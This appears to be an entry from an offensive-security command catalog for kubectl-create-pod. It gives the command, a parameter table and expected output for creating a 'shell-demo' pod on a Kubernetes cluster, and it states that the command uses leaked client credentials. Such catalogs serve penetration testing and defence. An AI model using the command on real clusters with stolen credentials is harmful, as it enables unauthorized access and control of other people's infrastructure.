---
data: >-
  kubectl --client-certificate client.crt --client-key client.pem
  --certificate-authority ca.crt --server https://████████ create -f
  https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml
tags:
  - kubernetes
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: c1659d97-c48d-42fe-a782-454145e35aa3
created_at: '2025-12-11T06:10:23.314Z'
updated_at: '2025-12-11T06:10:23.314Z'
verified: false
validated: true
submitted: true
---
# kubectl-create-pod

## Command

```bash
kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml
```

## Description

Creates a new pod in the Kubernetes cluster from a YAML file using leaked credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--client-certificate` | Client certificate file | Yes |
| `--client-key` | Client private key file | Yes |
| `--certificate-authority` | CA certificate file | Yes |
| `--server` | Kubernetes server URL | Yes |
| `create -f` | Create from URL | Yes |

## Examples

### Basic Usage

```bash
kubectl --client-certificate cert.crt --client-key key.pem --certificate-authority ca.crt --server https://k8s-server create -f pod.yaml
```

## Expected Output

pod "shell-demo" created

## Related

- [[commands/kubectl-delete-pod]]
- [[procedures/Interact-with-Kubernetes-Cluster-Using-Leaked-Credentials]]
